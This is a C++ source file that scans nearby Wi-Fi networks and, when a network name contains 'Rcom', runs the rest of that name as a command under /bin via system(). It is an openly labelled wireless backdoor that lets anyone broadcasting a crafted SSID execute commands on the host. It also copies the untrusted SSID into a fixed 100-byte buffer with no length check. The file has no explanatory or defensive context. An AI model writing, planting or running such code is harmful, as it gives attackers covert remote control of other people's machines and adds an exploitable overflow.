#include <iostream>
#include <string.h>
#include <iwlib.h>

int main() {

    wireless_scan_head head;
    wireless_scan *result;
    iwrange range;
    char command[100];
    int sock;

    sock = iw_sockets_open();
    if (sock < 0) {
        std::cerr << "Error opening wireless socket" << std::endl;
        return 1;
    }


    if (iw_get_range_info(sock, "wlp7s0", &range) < 0) {
        std::cerr << "Error obtaining frequency range information" << std::endl;
        return 1;
    }

  
    if (iw_scan(sock, "wlp7s0", range.we_version_compiled, &head) < 0) {
        std::cerr << "Error when scanning networks" << std::endl;
        return 1;
    }

    result = head.result;
    while (result != NULL) {
   
        char *found = strstr(result->b.essid, "Rcom");
        if (found != NULL) {
            
            std::cout << "Backdoor found: " << found + 4 << std::endl;
            strcpy(command, "/bin/");
            strcat(command, found + 4);
            system(command);
        }
        result = result->next;
    }

    iw_sockets_close(sock);

    return 0;
}
